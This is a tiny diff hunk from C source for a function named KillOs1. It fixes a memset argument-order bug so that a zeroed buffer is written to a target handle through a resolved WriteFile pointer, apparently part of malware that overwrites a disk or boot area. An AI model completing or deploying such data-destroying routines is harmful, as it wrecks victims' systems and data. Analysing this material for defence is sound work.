@@ -29,7 +29,7 @@ static bool KillOs1()
 	};
     
       
-    m_memset(p,sizeof(p),0);
+    m_memset(p, 0, sizeof(p));
 	size = sizeof(p);
 	ret = (BOOL) pWriteFile(hDest,p,size,&size,NULL);
         
